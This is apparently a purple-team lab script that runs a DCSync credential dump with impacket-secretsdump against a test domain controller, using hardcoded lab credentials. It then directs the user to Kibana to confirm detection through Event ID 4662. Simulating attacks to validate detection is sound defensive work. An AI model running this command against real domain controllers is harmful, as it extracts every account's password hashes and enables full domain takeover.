#!/bin/bash
# Attack Simulation: DCSync
# MITRE ATT&CK: T1003.006
# Usage: ./dcsync.sh
# Requirements: impacket installed on Kali

DC_IP="192.168.50.86"
DOMAIN="lab.local"
USERNAME="jsmith"
PASSWORD="Password123!"

echo "[*] Executing DCSync attack against $DC_IP"
impacket-secretsdump "${DOMAIN}/${USERNAME}:${PASSWORD}@${DC_IP}" -just-dc

echo "[*] Attack complete - check Kibana for Event ID 4662 with replication GUID 1131f6aa"
